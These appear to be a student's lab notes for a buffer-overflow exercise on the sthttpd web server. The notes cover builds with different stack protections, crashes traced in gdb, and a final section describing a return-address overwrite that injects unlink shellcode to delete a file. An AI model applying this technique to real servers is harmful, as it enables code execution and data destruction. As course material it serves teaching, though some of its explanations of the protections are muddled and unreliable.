1. 
First I check the start of your PATH and found that it is not 
what in spec. So I change the PATH to /usr/local/cs/bin by adding 
	
	export PATH="/usr/local/cs/bin:$PATH"

to the ~/.profile Then I source it
	
	source ~/.profile

And now which gcc gives
	
	/usr/local/cs/bin/gcc

2.
Then get the package

   http://web.cs.ucla.edu/classes/fall17/cs33/lab/sthttpd-2.27.0.tar.gz

Then untar it

	tar -xvzf sthttpd-2.27.0.tar.gz

To configure GCC,
	
	cd sthttpd-2.27.0/
	./configure \
  		LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"

Modify the source code according to the patch
	cd src
	vim sthttpd.c
	vim libhttpd.c

Compile files with different flags and rename
	make clean
	make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
	mv src/thttpd src/thttpd-sp

	make clean
	make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
	mv src/thttpd src/thttpd-as

	make clean
	make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
	mv src/thttpd src/thttpd-no


4.
First I created a text and put some characters in it (less than 100):
	vim junk.txt

Put in:
	you know i dont know what i am writing about
	just some random words
	hahaha
	i love cs33

Ports: 
	SP: 12622
	AS: 12623
	NO: 12624

Run sthttpd: (remove -D so that)
	src/thttpd-sp -p 12622 -D
	src/thttpd-as -p 12623 -D
	src/thttpd-no -p 12624 -D

Test the file:
	curl http://localhost:12622/junk.txt
	curl http://localhost:12623/junk.txt
	curl http://localhost:12624/junk.txt

All three versions work correctly

5.
To crush the sp version, I went back to the thttpd.c to look at the source code and found that 
	if ( strcasecmp( name, "debug" ) == 0 
	{
    	no_value_required( name, value );
    	debug = 1;
	}

Thus, I created a file named config.txt and put in more than 100 words of "debug"
	debug ... debug debug 

Then I crushed the program by
	gdb --args src/thttpd-sp -p 12622 -D -C config.txt

In gdb:	
	(gdb) r

Output:
	Starting program: /w/home.14/class/classsmj/cs33/smashingLab/sthttpd-2.27.0/src/thttpd-sp -p 12622 -D -C config.txt
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib64/libthread_db.so.1".
	*** stack smashing detected ***: /w/home.14/class/classsmj/cs33/smashingLab/sthttpd-2.27.0/src/thttpd-sp terminated

	Program received signal SIGSEGV, Segmentation fault.
	0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1

Then I backtraced the code:
	(gdb) bt

Output:
	#0  0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
	#1  0x00007ffff6db0019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
	#2  0x00007ffff76e5376 in backtrace () from /lib64/libc.so.6
	#3  0x00007ffff764df64 in __libc_message () from /lib64/libc.so.6
	#4  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
	#5  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
	#6  0x0000000000404edd in read_config (filename=<optimized out>) at thttpd.c:1190
	#7  0x7562656400677562 in ?? ()
	#8  0x0067756265640067 in ?? ()
	#9  0x6564006775626564 in ?? ()
	#10 0x7562656400677562 in ?? ()
	#11 0x0067756265640067 in ?? ()
	#12 0x6564006775626564 in ?? ()
	#13 0x7562656400677562 in ?? ()
	#14 0x0067756265640067 in ?? ()
	#15 0x6564006775626564 in ?? ()
	#16 0x7562656400677562 in ?? ()
	#17 0x0067756265640067 in ?? ()
	#18 0x6564006775626564 in ?? ()
	#19 0x7562656400677562 in ?? ()
	#20 0x0067756265640067 in ?? ()
	#21 0x6564006775626564 in ?? ()
	#22 0x7562656400677562 in ?? ()
	#23 0x0067756265640067 in ?? ()
	#24 0x6564006775626564 in ?? ()
	#25 0x7562656400677562 in ?? ()
	#26 0x0067756265640067 in ?? ()
	#27 0x6564006775626564 in ?? ()
	#28 0x7562656400677562 in ?? ()
	#29 0x0067756265640067 in ?? ()
	#30 0x6564006775626564 in ?? ()
	#31 0x7562656400677562 in ?? ()
	#32 0x0067756265640067 in ?? ()
	#33 0x0000000000000000 in ?? ()

To see what is going on, I set a breakpoint on read_config function and set 
disassemble-next-line on and I pressed enter to see next instruction.
	b read_config
	set disassemble-next-line on

After numerous enters are pressed,
	(gdb) 
	0x0000000000404e1e	1190	    }
	   0x0000000000404e10 <read_config+1120>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
	   0x0000000000404e15 <read_config+1125>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
	=> 0x0000000000404e1e <read_config+1134>:	0f 85 b4 00 00 00	jne    0x404ed8 <read_config+1320>
	   0x0000000000404e24 <read_config+1140>:	48 83 c4 70	add    $0x70,%rsp
	   0x0000000000404e28 <read_config+1144>:	5b	pop    %rbx
	   0x0000000000404e29 <read_config+1145>:	5d	pop    %rbp
	   0x0000000000404e2a <read_config+1146>:	41 5c	pop    %r12
	   0x0000000000404e2c <read_config+1148>:	41 5d	pop    %r13
	   0x0000000000404e2e <read_config+1150>:	41 5e	pop    %r14
	   0x0000000000404e30 <read_config+1152>:	c3	retq   
	(gdb) 
	1190	    }
	=> 0x0000000000404ed8 <read_config+1320>:	e8 a3 d5 ff ff	callq  0x402480 <__stack_chk_fail@plt>
	(gdb) 
	*** stack smashing detected ***: /w/home.14/class/classsmj/cs33/smashingLab/sthttpd-2.27.0/src/thttpd-sp terminated

Clearly, the read_config call another function, __stack_chk_fail@plt, to handle the case where stack smashing is detected. 
The reason is that the program checks for stack overflow by using a canary, so when it detected, it calls the function.


6. 
First 
	gdb --args src/thttpd-as -p 12623 -D -C config.txt

Then
	(gdb) r
	Starting program: /w/home.14/class/classsmj/cs33/smashingLab/sthttpd-2.27.0/src/thttpd-as -p 12623 -D -C config.txt
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib64/libthread_db.so.1".
	=================================================================
	==11313==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcd44 at pc 0x000000441de4 bp 0x7fffffffcca0 sp 0x7fffffffc450
	READ of size 361 at 0x7fffffffcd44 thread T0
	
	(gdb) bt
	#0  0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
	#1  0x00007ffff7074019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
	#2  0x00000000004d1863 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffaf50, pc=4464100, 
	    max_depth=<optimized out>)
	    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:123
	#3  0x0000000000419d7f in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, bp=140737488342176, 
	    pc=4464100, max_depth=256, stack=0x7fffffffaf50) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_stack.h:50
	#4  __asan::ErrorGeneric::Print (this=this@entry=0x980148 <__asan::ScopedInErrorReport::current_error_+8>)
	    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.cc:482
	#5  0x00000000004ccae8 in __asan::ErrorDescription::Print (
	    this=0x980140 <__asan::ScopedInErrorReport::current_error_>)
	    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.h:360
	#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb7c7, __in_chrg=<optimized out>)
	    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:167
	#7  __asan::ReportGenericError (pc=4464100, bp=bp@entry=140737488342176, sp=sp@entry=140737488340048, 
	    addr=addr@entry=140737488342340, is_write=is_write@entry=false, access_size=access_size@entry=361, exp=0, 
	    fatal=false) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:397
	#8  0x0000000000441e03 in __interceptor_strchr (s=<optimized out>, c=<optimized out>)
	    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
	#9  0x00000000004feb58 in read_config (filename=<optimized out>) at thttpd.c:1018
	#10 0x6564206775626564 in ?? ()
	#11 0x7562656420677562 in ?? ()
	#12 0x2067756265642067 in ?? ()
	#13 0x6564206775626564 in ?? ()
	#14 0x7562656420677562 in ?? ()
	#15 0x2067756265642067 in ?? ()
	#16 0x6564206775626564 in ?? ()
	#17 0x7562656420677562 in ?? ()
	#18 0x2067756265642067 in ?? ()
	#19 0x6564206775626564 in ?? ()
	#20 0x7562656420677562 in ?? ()
	#21 0x2067756265642067 in ?? ()
	#22 0x6564206775626564 in ?? ()
	#23 0x7562656420677562 in ?? ()
	#24 0x2067756265642067 in ?? ()
	#25 0x6564206775626564 in ?? ()
	#26 0x7562656420677562 in ?? ()
	#27 0x0a67756265642067 in ?? ()
	#28 0x000060be00000000 in ?? ()
	#29 0x0000000001182478 in ?? ()
	#30 0x00000000004dad8a in __sanitizer::MmapFixedOrDie (fixed_addr=8458434530869998946, size=7306000124224890212)
	    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_posix.cc:194
	#31 0x00000000005252ba in ?? ()

To see what is going on, I set a breakpoint on read_config function and set 
disassemble-next-line on and I pressed ni then enter to see next instruction.
	b read_config
	set disassemble-next-line on

After numerous enters are pressed,
	0x00000000004feb53	1018		if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
	   0x00000000004feb4b <read_config+171>:	be 23 00 00 00	mov    $0x23,%esi
	   0x00000000004feb50 <read_config+176>:	4c 89 e7	mov    %r12,%rdi
	=> 0x00000000004feb53 <read_config+179>:	e8 f8 34 f4 ff	callq  0x442050 <__interceptor_strchr(char const*, int)>
	   0x00000000004feb58 <read_config+184>:	48 85 c0	test   %rax,%rax
	   0x00000000004feb5b <read_config+187>:	74 23	je     0x4feb80 <read_config+224>
	(gdb) 
	=================================================================
	==4793==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcd44 at pc 0x000000441de4 bp 0x7fffffffcca0 sp 0x7fffffffc450
	READ of size 361 at 0x7fffffffcd44 thread T0

	Program received signal SIGSEGV, Segmentation fault.
	0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1

The last instruction the program call is callq  0x442050 <__interceptor_strchr(char const*, int)>. 
To check for problem, the program called __interceptor_strchr(char const*, int) By googling, 
I found that the flag -fsanitize=address uses "poisoned redzones" to check for memory allocation problem.

7.
First 
	gdb --args src/thttpd-no -p 12624 -D -C config.txt

Then
	(gdb) r
	Starting program: /w/home.14/class/classsmj/cs33/smashingLab/sthttpd-2.27.0/src/thttpd-no -p 12624 -D -C config.txt
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib64/libthread_db.so.1".

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
	1190	    }

	(gdb) bt
	#0  0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
	#1  0x7562656400677562 in ?? ()
	#2  0x0067756265640067 in ?? ()
	#3  0x6564006775626564 in ?? ()
	#4  0x7562656400677562 in ?? ()
	#5  0x0067756265640067 in ?? ()
	#6  0x6564006775626564 in ?? ()
	#7  0x7562656400677562 in ?? ()
	#8  0x0067756265640067 in ?? ()
	#9  0x6564006775626564 in ?? ()
	#10 0x7562656400677562 in ?? ()
	#11 0x0067756265640067 in ?? ()
	#12 0x6564006775626564 in ?? ()
	#13 0x7562656400677562 in ?? ()
	#14 0x0067756265640067 in ?? ()
	#15 0x6564006775626564 in ?? ()
	#16 0x7562656400677562 in ?? ()
	#17 0x0067756265640067 in ?? ()
	#18 0x6564006775626564 in ?? ()
	#19 0x7562656400677562 in ?? ()
	#20 0x0067756265640067 in ?? ()
	#21 0x6564006775626564 in ?? ()
	#22 0x7562656400677562 in ?? ()
	#23 0x0067756265640067 in ?? ()
	#24 0x6564006775626564 in ?? ()
	#25 0x7562656400677562 in ?? ()
	#26 0x0067756265640067 in ?? ()
	#27 0x0000000000000000 in ?? ()

To see what is going on, I set a breakpoint on read_config function and set disassemble-next-line 
on and I pressed ni then enter to see next instruction.
	b read_config
	set disassemble-next-line on


After numerous enters are pressed,
	(gdb) 
	0x0000000000404c8c	1190	    }
	0x0000000000404c80 <read_config+1104>:	48 83 c4 70	add    $0x70,%rsp
	0x0000000000404c84 <read_config+1108>:	5b	pop    %rbx
	0x0000000000404c85 <read_config+1109>:	5d	pop    %rbp
	0x0000000000404c86 <read_config+1110>:	41 5c	pop    %r12
	0x0000000000404c88 <read_config+1112>:	41 5d	pop    %r13
	0x0000000000404c8a <read_config+1114>:	41 5e	pop    %r14
	=> 0x0000000000404c8c <read_config+1116>:	c3	retq   
	(gdb) 

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190

The last instruction was return. Unlike the previous two, the program doesn't use any function 
to handle overflow. Rather, since it uses -zexecstack, if we tried to execute something not executable, 
it will overwrite the return address.


8.
To generate .s file, after googling, I used:
	gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
	gcc -S -O2 -fno-inline -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s
	gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s

The -sp version uses canary in the stack frame. As written in question 5, in the instruction: xor    %fs:0x28,%rax, 
the program check canary to make sure no overflow happened in the stack


The -as version redzones to keep track of memory location repeatly. From the .s file, the program 
calls asan_report_load and abort the program with an error message.

The -no doesn't check overflow because in the flag it says -fno-stack-protector so no stack protection 
is used. Rather, the program checks for the return address and overwrite it.

9.
First, create a file exploit.txt and write "port=target.txt".
	vim exploit.txt

Then I ran the program with the file 
	gdb --args src/thttpd-no -p 12624 -D -C exploit.txt
	
Set a break point in the read_config 
	(gdb) break read_config

Run the program
	(gdb) r

	(gdb) info frame
	Stack level 0, frame at 0x7fffffffcf40:
	rip = 0x404830 in read_config (thttpd.c:1000); saved rip 0x40511f
	called by frame at 0x7fffffffcf80
	source language c.
	Arglist at 0x7fffffffcf30, args: filename=0x7fffffffe4ef "exploit.txt"
	Locals at 0x7fffffffcf30, Previous frame's sp is 0x7fffffffcf40
	Saved registers:
	rip at 0x7fffffffcf38

Find the address of target.txt:
	(gdb) print &line
	$1 = (char (*)[100]) 0x7fffffffcea0

Then I used asm() and a system call to unlink. The function canbe found in the file deTarget.c. 
I first stored 0x57 into %rax, then passed pointer to target.txt into %rdi.

After calculating some offset, I found that it has offset of 5.

Then get the assemble code of delete
	gcc -O2 -c deTarget.c
	objdump -d deTarget.o

Extract the bytecode, converted the hex chars to raw values, and appended it to my exploit.txt file:
	cat hexdelete.txt | ../hex2raw > rawdelete.txt 
	cat rawdelete.txt >> exploit.txt

Added some extra chars to the exploit.txt, then appended the address of the start of my bytecode to the end.

Then verify by checking the contents of the stack against the file hexdelete.txt, 
which contains the hex of my deTarget().
	(gdb) x/50x $sp
	0x7fffffffcf38:	0x0040511f	0x00000000	0x00000018	0x00000000
	0x7fffffffcf48:	0xffffd040	0x00007fff	0xffffe1e8	0x00007fff
	0x7fffffffcf58:	0xffffcfc0	0x00007fff	0xffffe1e0	0x00007fff
	0x7fffffffcf68:	0x00000000	0x00000000	0x00000000	0x00000000
	0x7fffffffcf78:	0x004036e3	0x00000000	0xf7ddb8d0	0x00007fff
	0x7fffffffcf88:	0x000001c8	0x00000000	0x0000000a	0x00000000
	0x7fffffffcf98:	0x00000000	0x00000000	0x00000000	0x00000000
	0x7fffffffcfa8:	0x00000000	0x00000000	0x00000000	0x00000000
	0x7fffffffcfb8:	0x00000000	0x00000000	0xf7fce000	0x00007fff
	0x7fffffffcfc8:	0x0299c297	0x00d2c351	0xf7ffe150	0x00007fff
	0x7fffffffcfd8:	0x029658d7	0x00d2c351	0x00000000	0x00000000
	0x7fffffffcfe8:	0xf7df1af8	0x00007fff	0xffffe100	0x00007fff
	0x7fffffffcff8:	0xf7ddec17	0x00007fff

Then run it again and it has already deleted.




